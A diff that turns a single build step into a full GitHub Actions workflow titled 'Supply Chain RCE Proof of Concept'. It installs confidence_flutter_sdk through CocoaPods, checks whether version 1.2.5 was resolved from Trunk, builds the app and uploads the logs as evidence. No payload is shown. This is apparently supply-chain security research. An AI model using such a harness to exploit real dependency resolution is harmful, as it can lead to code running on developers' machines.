@@ -1,28 +1,35 @@
-- name: Execute Full RCE Chain
-  run: |
-    flutter create rce_test
-    cd rce_test
-    
-    # 1. Add package DULU → generate Podfile
-    flutter pub add confidence_flutter_sdk
-    
-    # 2. BARU patch Podfile
-    sed -i '' "s/# platform :ios, '12.0'/platform :ios, '16.0'/" ios/Podfile
-    
-    # 3. Pod install
-    cd ios
-    pod repo update
-    pod install --verbose 2>&1 | tee pod_install.log
-    
-    echo "=== VERIFYING RESOLUTION ==="
-    if grep -q "Installing confidence_flutter_sdk 1.2.5" pod_install.log; then
-      echo "✅ SUCCESS: Version 1.2.5 (Trunk) was pulled!"
-    else
-      echo "❌ FAILED: Version 1.2.5 not found in logs."
-    fi
-    
-    cat Podfile.lock
-    
-    cd ..
-    flutter build ios --no-codesign 2>&1 | tee build.log
-    tail -n 20 build.log
+name: Supply Chain RCE Proof of Concept
+on: [push, workflow_dispatch]
+jobs:
+  poc:
+    runs-on: macos-latest
+    steps:
+      - name: Setup Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          channel: 'stable'
+
+      - name: Execute Full RCE Chain
+        run: |
+          flutter create rce_test
+          cd rce_test
+          flutter pub add confidence_flutter_sdk
+          sed -i '' "s/# platform :ios, '12.0'/platform :ios, '16.0'/" ios/Podfile
+          cd ios
+          pod repo update
+          pod install --verbose 2>&1 | tee pod_install.log
+          grep -q "Installing confidence_flutter_sdk 1.2.5" pod_install.log && echo "SUCCESS: 1.2.5 pulled" || echo "FAILED"
+          cat Podfile.lock
+          cd ..
+          flutter build ios --no-codesign 2>&1 | tee build.log
+          tail -n 20 build.log
+
+      - name: Upload Logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-evidence
+          path: |
+            rce_test/ios/pod_install.log
+            rce_test/ios/Podfile.lock
+            rce_test/build.log
